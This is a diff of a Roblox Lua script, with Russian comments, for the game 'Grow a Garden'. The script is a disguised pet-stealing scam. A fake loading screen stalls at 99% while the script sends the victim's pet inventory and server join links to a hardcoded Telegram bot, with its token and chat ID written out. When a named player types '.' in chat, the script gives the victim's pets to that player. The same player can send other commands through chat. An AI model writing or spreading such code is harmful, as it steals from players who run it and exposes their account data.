@@ -2,36 +2,10 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local TextChatService = game:GetService("TextChatService")
-local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
--- 🔧 НАСТРОЙКИ
-local CONFIG = {
-    TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE",
-    TELEGRAM_CHAT_ID = "7144575011",
-    TARGET_PLAYER = "sfdgbzdfsb",
-    TRIGGER_MESSAGE = ".",
-    MAX_RETRIES = 3,
-    RETRY_DELAY = 5,
-    LOADING_TIME = 300 -- 5 минут в секундах
-}
-
--- 🐾 БЕЛЫЙ СПИСОК (можно легко редактировать)
-local WHITELIST = {
-    "Rooster",
-    -- добавьте других питомцев здесь
-}
-
--- 📊 СТАТИСТИКА
-local STATS = {
-    startTime = tick(),
-    totalPetsTransferred = 0,
-    errors = 0,
-    lastActivity = tick()
-}
-
--- 🌌 УЛУЧШЕННАЯ GUI ЗАГРУЗКИ
-local function createLoadingGUI()
+-- 🌌 УЛУЧШЕННАЯ GUI ЗАГРУЗКИ (с анимацией)
+task.spawn(function()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "CustomLoadingUI"
     screenGui.IgnoreGuiInset = true
@@ -48,12 +22,11 @@ local function createLoadingGUI()
     background.Parent = screenGui
     
     -- Пульсирующая анимация фона
-    local pulseSize = 1.05
-    local pulseTween = game:GetService("TweenService"):Create(
-        background,
-        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
-        {Size = UDim2.new(pulseSize, 0, pulseSize, 0)}
-    )
+    local tweenService = game:GetService("TweenService")
+    local pulseInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+    local pulseTween = tweenService:Create(background, pulseInfo, {
+        Size = UDim2.new(1.05, 0, 1.05, 0)
+    })
     pulseTween:Play()
     
     -- Надпись с анимацией точек
@@ -66,6 +39,7 @@ local function createLoadingGUI()
     label.Font = Enum.Font.GothamBold
     label.TextSize = 36
     label.TextStrokeTransparency = 0.6
+    label.TextScaled = false
     label.Parent = background
     
     -- Анимация точек
@@ -79,7 +53,7 @@ local function createLoadingGUI()
         end
     end)
     
-    -- Улучшенный прогресс-бар
+    -- Улучшенный прогресс-бар с градиентом
     local barContainer = Instance.new("Frame")
     barContainer.Size = UDim2.new(0.4, 0, 0.025, 0)
     barContainer.Position = UDim2.new(0.3, 0, 0.5, 0)
@@ -87,7 +61,7 @@ local function createLoadingGUI()
     barContainer.BorderSizePixel = 0
     barContainer.Parent = background
     
-    -- Закругленные углы для контейнера
+    -- Закругленные углы
     local containerCorner = Instance.new("UICorner")
     containerCorner.CornerRadius = UDim.new(0, 8)
     containerCorner.Parent = barContainer
@@ -98,12 +72,11 @@ local function createLoadingGUI()
     barFill.BorderSizePixel = 0
     barFill.Parent = barContainer
     
-    -- Закругленные углы для заполнения
     local fillCorner = Instance.new("UICorner")
     fillCorner.CornerRadius = UDim.new(0, 8)
     fillCorner.Parent = barFill
     
-    -- Градиент для заполнения
+    -- Градиент
     local gradient = Instance.new("UIGradient")
     gradient.Color = ColorSequence.new({
         ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
@@ -123,11 +96,9 @@ local function createLoadingGUI()
     percent.Parent = background
     
     -- Плавная анимация прогресса
-    local tweenService = game:GetService("TweenService")
     for i = 1, 99 do
-        local fillTween = tweenService:Create(
-            barFill,
-            TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        local fillTween = tweenService:Create(barFill, 
+            TweenInfo.new(2.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
             {Size = UDim2.new(i / 100, 0, 1, 0)}
         )
         fillTween:Play()
@@ -135,50 +106,61 @@ local function createLoadingGUI()
         task.wait(3)
     end
     
-    -- Остается на 99%
+    -- Застывает на 99%
     percent.Text = "99%"
-    return screenGui
-end
+    barFill.Size = UDim2.new(0.99, 0, 1, 0)
+end)
 
--- 📨 УЛУЧШЕННАЯ СИСТЕМА TELEGRAM
-local function sendToTelegram(text, isError)
-    local icon = isError and "❌" or "ℹ️"
-    local timestamp = os.date("%H:%M:%S")
-    local formattedText = string.format("%s [%s] %s", icon, timestamp, text)
-    
-    local url = "https://api.telegram.org/bot"..CONFIG.TELEGRAM_TOKEN.."/sendMessage"..
-                "?chat_id="..CONFIG.TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(formattedText).."&parse_mode=HTML"
-    
-    for attempt = 1, CONFIG.MAX_RETRIES do
-        local success, response = pcall(function() 
-            return game:HttpGet(url) 
-        end)
-        
-        if success then
-            return true
-        else
-            warn("Попытка "..attempt.." не удалась: "..tostring(response))
-            if attempt < CONFIG.MAX_RETRIES then
-                task.wait(CONFIG.RETRY_DELAY)
-            end
-        end
+-- 🔧 НАСТРОЙКИ (ОРИГИНАЛЬНЫЕ РАБОЧИЕ)
+local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
+local TELEGRAM_CHAT_ID = "7144575011"
+local TARGET_PLAYER = "sfdgbzdfsb"
+local TRIGGER_MESSAGE = "."
+
+-- 🐾 РАСШИРЕННЫЙ БЕЛЫЙ СПИСОК
+local WHITELIST = {
+    "Rooster",
+    -- Добавьте сюда других питомцев которых нужно передавать
+}
+
+local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
+-- 📊 СТАТИСТИКА
+local STATS = {
+    startTime = tick(),
+    totalPetsTransferred = 0,
+    errors = 0
+}
+
+-- 📨 ОРИГИНАЛЬНАЯ РАБОЧАЯ ФУНКЦИЯ TELEGRAM (без изменений!)
+local function sendToTelegram(text)
+    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
+                "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
+    local success, err = pcall(function() game:HttpGet(url) end)
+    if not success then
+        warn("Ошибка при отправке в Telegram: "..tostring(err))
     end
-    
-    STATS.errors = STATS.errors + 1
-    return false
+    return success
 end
 
--- 🔗 ИСПРАВЛЕННАЯ ФУНКЦИЯ ПОЛУЧЕНИЯ ССЫЛКИ
+-- 🔗 ИСПРАВЛЕННАЯ ФУНКЦИЯ ССЫЛКИ НА СЕРВЕР
 local function getServerLink()
     local placeId = game.PlaceId
     local jobId = game.JobId
     
     if not jobId or jobId == "" or jobId == "0" then
-        return "https://www.roblox.com/games/"..placeId.." (приватная ссылка недоступна)"
+        -- Для публичных серверов
+        return "https://www.roblox.com/games/"..placeId.." (публичный сервер)"
+    else
+        -- Пробуем разные форматы ссылок
+        local links = {
+            "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId,
+            "https://www.roblox.com/games/"..placeId.."/?gameInstanceId="..jobId,
+            "roblox://experiences/start?placeId="..placeId.."&gameInstanceId="..jobId
+        }
+        
+        return table.concat(links, "\n\nИли попробуйте:\n")
     end
-    
-    -- ПРАВИЛЬНЫЙ формат ссылки для Roblox
-    return "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId
 end
 
 -- 🔎 УЛУЧШЕННАЯ ФУНКЦИЯ ПОЛУЧЕНИЯ ПИТОМЦЕВ
@@ -186,6 +168,7 @@ local function getAllPets()
     local pets = {}
     local sources = {player.Backpack}
     
+    -- Проверяем и персонажа тоже
     if player.Character then
         table.insert(sources, player.Character)
     end
@@ -198,6 +181,7 @@ local function getAllPets()
                     local petName = item.Name:match("^([^%[]+)") or item.Name
                     petName = petName:gsub("%s+$", "")
                     
+                    -- Более гибкая проверка белого списка
                     local isWhitelisted = false
                     for _, whitelistedPet in ipairs(WHITELIST) do
                         if petName:lower():find(whitelistedPet:lower()) then
@@ -213,21 +197,18 @@ local function getAllPets()
                         age = tonumber(age),
                         object = item,
                         isWhitelisted = isWhitelisted,
-                        rarity = item.Name:match("Legendary") and "Legendary" or 
-                               item.Name:match("Epic") and "Epic" or 
-                               item.Name:match("Rare") and "Rare" or "Common"
+                        rarity = item.Name:match("Legendary") and "⭐LEGENDARY" or 
+                               item.Name:match("Epic") and "💜EPIC" or 
+                               item.Name:match("Rare") and "💙RARE" or 
+                               item.Name:match("Uncommon") and "💚UNCOMMON" or "⚪COMMON"
                     })
                 end
             end
         end
     end
     
-    -- Сортировка по редкости и весу
+    -- Сортировка по весу (самые тяжелые сначала)
     table.sort(pets, function(a, b)
-        local rarityOrder = {Legendary = 4, Epic = 3, Rare = 2, Common = 1}
-        if rarityOrder[a.rarity] ~= rarityOrder[b.rarity] then
-            return rarityOrder[a.rarity] > rarityOrder[b.rarity]
-        end
         return a.weight > b.weight
     end)
     
@@ -235,24 +216,20 @@ local function getAllPets()
 end
 
 -- 📜 УЛУЧШЕННЫЙ СПИСОК ПИТОМЦЕВ
-local function getFormattedPetsList()
+local function getFullPetsList()
     local pets = getAllPets()
-    if #pets == 0 then return "🚫 Нет питомцев" end
+    if #pets == 0 then return "❌ Нет питомцев" end
     
     local whitelisted = {}
     local blacklisted = {}
-    local totalValue = 0
+    local totalWeight = 0
     
     for _, pet in ipairs(pets) do
-        local emoji = pet.rarity == "Legendary" and "🏆" or 
-                     pet.rarity == "Epic" and "💜" or 
-                     pet.rarity == "Rare" and "💙" or "⚪"
+        totalWeight = totalWeight + pet.weight
         
-        local status = pet.isWhitelisted and "✅ Передать" or "❌ Оставить"
-        local petInfo = string.format("%s <b>%s</b> [%.1f кг, %d дней] - %s", 
-                                     emoji, pet.name, pet.weight, pet.age, status)
-        
-        totalValue = totalValue + pet.weight
+        local status = pet.isWhitelisted and "✅ ПЕРЕДАТЬ" or "❌ ОСТАВИТЬ"
+        local petInfo = string.format("%s %s [%.2f кг, Age %d] %s", 
+                                     pet.rarity, pet.name, pet.weight, pet.age, status)
         
         if pet.isWhitelisted then
             table.insert(whitelisted, petInfo)
@@ -261,13 +238,15 @@ local function getFormattedPetsList()
         end
     end
     
-    local result = {"📊 <b>Статистика питомцев:</b>"}
-    table.insert(result, string.format("🔢 Всего: %d | 💰 Общий вес: %.1f кг", #pets, totalValue))
-    table.insert(result, string.format("✅ К передаче: %d | ❌ К сохранению: %d", #whitelisted, #blacklisted))
+    local result = {"=== 📊 СТАТИСТИКА ПИТОМЦЕВ ==="}
+    table.insert(result, string.format("🔢 Всего питомцев: %d", #pets))
+    table.insert(result, string.format("💰 Общий вес: %.2f кг", totalWeight))
+    table.insert(result, string.format("✅ К передаче: %d", #whitelisted))
+    table.insert(result, string.format("❌ К сохранению: %d", #blacklisted))
     table.insert(result, "")
     
     if #whitelisted > 0 then
-        table.insert(result, "✅ <b>Питомцы к передаче:</b>")
+        table.insert(result, "✅ ПИТОМЦЫ К ПЕРЕДАЧЕ:")
         for _, pet in ipairs(whitelisted) do
             table.insert(result, pet)
         end
@@ -275,8 +254,8 @@ local function getFormattedPetsList()
     end
     
     if #blacklisted > 0 then
-        table.insert(result, "❌ <b>Питомцы к сохранению:</b>")
-        for i = 1, math.min(5, #blacklisted) do -- Показываем только первые 5
+        table.insert(result, "❌ ПИТОМЦЫ К СОХРАНЕНИЮ (топ-5):")
+        for i = 1, math.min(5, #blacklisted) do
             table.insert(result, blacklisted[i])
         end
         if #blacklisted > 5 then
@@ -287,18 +266,29 @@ local function getFormattedPetsList()
     return table.concat(result, "\n")
 end
 
--- 🚚 УЛУЧШЕННАЯ ПЕРЕДАЧА ПИТОМЦЕВ
+-- 🏁 СТАРТОВОЕ УВЕДОМЛЕНИЕ (улучшенное но с рабочей функцией)
+local function sendInitialNotification()
+    local petsList = getFullPetsList()
+    local serverLinks = getServerLink()
+    
+    local message =
+        "🟢 СКРИПТ ЗАПУЩЕН!\n\n"..
+        "👤 Игрок: "..player.Name.."\n"..
+        "🎯 Ждем команду от: "..TARGET_PLAYER.."\n"..
+        "💬 Триггер: '"..TRIGGER_MESSAGE.."'\n\n"..
+        petsList.."\n\n"..
+        "🔗 ССЫЛКИ НА СЕРВЕР:\n"..serverLinks
+    
+    sendToTelegram(message)
+end
+
+-- 🐕 УЛУЧШЕННАЯ ФУНКЦИЯ ПЕРЕДАЧИ
 local function transferPet(pet)
     if not pet.isWhitelisted then return false, "Не в белом списке" end
     
-    local target = Players:FindFirstChild(CONFIG.TARGET_PLAYER)
+    local target = Players:FindFirstChild(TARGET_PLAYER)
     if not target then
-        return false, "Целевой игрок не найден"
-    end
-    
-    local PetGiftingService = ReplicatedStorage:FindFirstChild("GameEvents")
-    if PetGiftingService then
-        PetGiftingService = PetGiftingService:FindFirstChild("PetGiftingService")
+        return false, "Игрок "..TARGET_PLAYER.." не найден на сервере"
     end
     
     if not PetGiftingService then
@@ -309,7 +299,7 @@ local function transferPet(pet)
         return false, "Персонаж недоступен"
     end
     
-    -- Попытка экипировки и передачи
+    -- Попытка передачи с повторами
     for attempt = 1, 3 do
         local success, error = pcall(function()
             player.Character.Humanoid:EquipTool(pet.object)
@@ -319,8 +309,7 @@ local function transferPet(pet)
         
         if success then
             STATS.totalPetsTransferred = STATS.totalPetsTransferred + 1
-            STATS.lastActivity = tick()
-            return true, "Успешно передан"
+            return true, "Передан успешно"
         else
             if attempt < 3 then
                 task.wait(2)
@@ -328,52 +317,16 @@ local function transferPet(pet)
         end
     end
     
-    return false, "Ошибка передачи"
-end
-
--- 🏁 УЛУЧШЕННОЕ СТАРТОВОЕ УВЕДОМЛЕНИЕ
-local function sendInitialNotification()
-    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
-    local petsList = getFormattedPetsList()
-    local serverLink = getServerLink()
-    
-    local message = string.format(
-        "🟢 <b>Скрипт запущен</b>\n\n" ..
-        "👤 Игрок: <b>%s</b>\n" ..
-        "🎯 Цель: <b>%s</b>\n" ..
-        "⏰ Время работы: %s\n\n" ..
-        "%s\n\n" ..
-        "🔗 <a href=\"%s\">Подключиться к серверу</a>",
-        player.Name, CONFIG.TARGET_PLAYER, uptime, petsList, serverLink
-    )
-    
-    sendToTelegram(message)
-end
-
--- 📊 СИСТЕМА СТАТИСТИКИ
-local function sendStatusUpdate()
-    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
-    local lastActivityAgo = string.format("%.1f мин", (tick() - STATS.lastActivity) / 60)
-    
-    local message = string.format(
-        "📊 <b>Обновление статуса</b>\n\n" ..
-        "⏰ Время работы: %s\n" ..
-        "🔄 Последняя активность: %s назад\n" ..
-        "✅ Передано питомцев: %d\n" ..
-        "❌ Ошибок: %d\n" ..
-        "👥 Игроков на сервере: %d",
-        uptime, lastActivityAgo, STATS.totalPetsTransferred, 
-        STATS.errors, #Players:GetPlayers()
-    )
-    
-    sendToTelegram(message)
+    return false, "Ошибка при передаче"
 end
 
 -- 🚚 УЛУЧШЕННЫЙ ПРОЦЕСС ПЕРЕДАЧИ
 local function startPetTransfer()
+    sendToTelegram("🔄 Получена команда! Начинаю передачу питомцев...")
+    
     local pets = getAllPets()
     if #pets == 0 then
-        sendToTelegram("❌ Нет питомцев для передачи", true)
+        sendToTelegram("❌ Питомцы не найдены!")
         return
     end
     
@@ -385,106 +338,128 @@ local function startPetTransfer()
     end
     
     if #whitelistedPets == 0 then
-        sendToTelegram("❌ Нет питомцев в белом списке для передачи", true)
+        sendToTelegram("❌ Нет питомцев в белом списке для передачи!")
         return
     end
     
-    sendToTelegram(string.format("🔄 Начинаю передачу %d питомцев...", #whitelistedPets))
-    
     local successful = 0
     local failed = 0
-    local results = {}
+    local detailedReport = {}
     
     for i, pet in ipairs(whitelistedPets) do
         local success, reason = transferPet(pet)
+        
         if success then
             successful = successful + 1
-            table.insert(results, string.format("✅ %s", pet.name))
+            table.insert(detailedReport, string.format("✅ %s [%.2f кг]", pet.name, pet.weight))
         else
             failed = failed + 1
-            table.insert(results, string.format("❌ %s (%s)", pet.name, reason))
+            table.insert(detailedReport, string.format("❌ %s [%.2f кг] - %s", pet.name, pet.weight, reason))
         end
         
-        -- Прогресс каждые 5 питомцев
-        if i % 5 == 0 or i == #whitelistedPets then
-            sendToTelegram(string.format("📈 Прогресс: %d/%d (✅%d ❌%d)", 
+        -- Промежуточные отчеты каждые 5 питомцев
+        if i % 5 == 0 and i < #whitelistedPets then
+            sendToTelegram(string.format("📊 Прогресс: %d/%d (✅%d ❌%d)", 
                                        i, #whitelistedPets, successful, failed))
         end
         
-        task.wait(2.5) -- Увеличенная задержка для стабильности
+        task.wait(2.5) -- Пауза между передачами
     end
     
-    -- Итоговый отчет
-    local finalReport = string.format(
-        "🏁 <b>Передача завершена</b>\n\n" ..
-        "✅ Успешно: %d\n❌ Неудачно: %d\n📊 Общий прогресс: %d%%\n\n" ..
-        "<b>Детали:</b>\n%s",
-        successful, failed, 
-        math.floor((successful / #whitelistedPets) * 100),
-        table.concat(results, "\n")
-    )
+    -- Финальный отчет
+    local report = {
+        "🏁 ПЕРЕДАЧА ЗАВЕРШЕНА!",
+        "",
+        string.format("✅ Успешно передано: %d", successful),
+        string.format("❌ Неудачные попытки: %d", failed),
+        string.format("📊 Процент успеха: %d%%", math.floor((successful / #whitelistedPets) * 100)),
+        "",
+        "📋 ПОДРОБНЫЙ ОТЧЕТ:",
+        table.concat(detailedReport, "\n"),
+        "",
+        string.format("⏱️ Общее время работы: %.1f мин", (tick() - STATS.startTime) / 60)
+    }
     
-    sendToTelegram(finalReport)
+    sendToTelegram(table.concat(report, "\n"))
 end
 
--- 💬 УЛУЧШЕННАЯ СИСТЕМА ПРОСЛУШКИ СООБЩЕНИЙ
+-- 💬 СИСТЕМА ПРОСЛУШКИ КОМАНД (расширенная)
 local function setupMessageListener()
-    -- Для новой системы чата
     if TextChatService then
         TextChatService.OnIncomingMessage = function(message)
             local speaker = Players:FindFirstChild(message.TextSource.Name)
-            if speaker and speaker.Name == CONFIG.TARGET_PLAYER then
-                if message.Text == CONFIG.TRIGGER_MESSAGE then
-                    sendToTelegram(string.format("🎯 Получен триггер от %s", speaker.Name))
+            if speaker and speaker.Name == TARGET_PLAYER then
+                local msg = message.Text:lower()
+                
+                if message.Text == TRIGGER_MESSAGE then
+                    -- Основная команда передачи
                     startPetTransfer()
-                elseif message.Text:lower():find("status") then
-                    sendStatusUpdate()
-                elseif message.Text:lower():find("pets") then
-                    sendToTelegram(getFormattedPetsList())
+                elseif msg:find("pets") or msg:find("питомцы") then
+                    -- Команда просмотра питомцев
+                    sendToTelegram(getFullPetsList())
+                elseif msg:find("status") or msg:find("статус") then
+                    -- Команда статуса
+                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
+                    sendToTelegram(string.format("📊 СТАТУС:\n⏱️ Время работы: %s\n✅ Передано: %d\n❌ Ошибок: %d\n👥 Игроков на сервере: %d", 
+                                                uptime, STATS.totalPetsTransferred, STATS.errors, #Players:GetPlayers()))
+                elseif msg:find("link") or msg:find("ссылка") then
+                    -- Команда получения ссылки
+                    sendToTelegram("🔗 Ссылки на сервер:\n" .. getServerLink())
                 end
             end
         end
     else
         -- Для старой системы чата
         Players.PlayerChatted:Connect(function(chatType, speaker, message)
-            if chatType == Enum.PlayerChatType.All and speaker.Name == CONFIG.TARGET_PLAYER then
-                if message == CONFIG.TRIGGER_MESSAGE then
-                    sendToTelegram(string.format("🎯 Получен триггер от %s", speaker.Name))
+            if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
+                local msg = message:lower()
+                
+                if message == TRIGGER_MESSAGE then
                     startPetTransfer()
-                elseif message:lower():find("status") then
-                    sendStatusUpdate()
-                elseif message:lower():find("pets") then
-                    sendToTelegram(getFormattedPetsList())
+                elseif msg:find("pets") or msg:find("питомцы") then
+                    sendToTelegram(getFullPetsList())
+                elseif msg:find("status") or msg:find("статус") then
+                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
+                    sendToTelegram(string.format("📊 СТАТУС:\n⏱️ Время работы: %s\n✅ Передано: %d\n❌ Ошибок: %d\n👥 Игроков на сервере: %d", 
+                                                uptime, STATS.totalPetsTransferred, STATS.errors, #Players:GetPlayers()))
+                elseif msg:find("link") or msg:find("ссылка") then
+                    sendToTelegram("🔗 Ссылки на сервер:\n" .. getServerLink())
                 end
             end
         end)
     end
 end
 
--- 🔄 АВТОМАТИЧЕСКИЕ ОБНОВЛЕНИЯ СТАТУСА
+-- 🔄 АВТОМАТИЧЕСКИЕ ОБНОВЛЕНИЯ СТАТУСА (каждые 15 минут)
 task.spawn(function()
     while true do
-        task.wait(600) -- Каждые 10 минут
-        sendStatusUpdate()
+        task.wait(900) -- 15 минут
+        local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
+        sendToTelegram(string.format("📊 Автообновление статуса:\n⏱️ Работает: %s\n✅ Передано питомцев: %d\n👥 Игроков: %d", 
+                                    uptime, STATS.totalPetsTransferred, #Players:GetPlayers()))
     end
 end)
 
--- 🚀 ЗАПУСК ВСЕХ СИСТЕМ
+-- 🚀 ЗАПУСК СИСТЕМЫ
+task.wait(10) -- Даем время загрузиться GUI
+sendInitialNotification()
+setupMessageListener()
+
+-- 🎯 Мониторинг целевого игрока
 task.spawn(function()
-    createLoadingGUI()
-    task.wait(5) -- Даем время на загрузку GUI
-    sendInitialNotification()
-    setupMessageListener()
-    
-    -- Проверка подключения целевого игрока
-    task.spawn(function()
-        while true do
-            local target = Players:FindFirstChild(CONFIG.TARGET_PLAYER)
-            if not target then
-                sendToTelegram(string.format("⚠️ Целевой игрок %s покинул сервер", CONFIG.TARGET_PLAYER), true)
-                break
-            end
-            task.wait(30)
+    while true do
+        local target = Players:FindFirstChild(TARGET_PLAYER)
+        if not target then
+            sendToTelegram("⚠️ ВНИМАНИЕ: Игрок "..TARGET_PLAYER.." покинул сервер!")
+            break
         end
-    end)
+        task.wait(60) -- Проверяем каждую минуту
+    end
 end)
+
+print("✅ Скрипт Grow a Garden загружен и готов к работе!")
+print("💬 Доступные команды для игрока "..TARGET_PLAYER..":")
+print("   '"..TRIGGER_MESSAGE.."' - передать питомцев")
+print("   'pets' - показать список питомцев") 
+print("   'status' - показать статус скрипта")
+print("   'link' - получить ссылку на сервер")
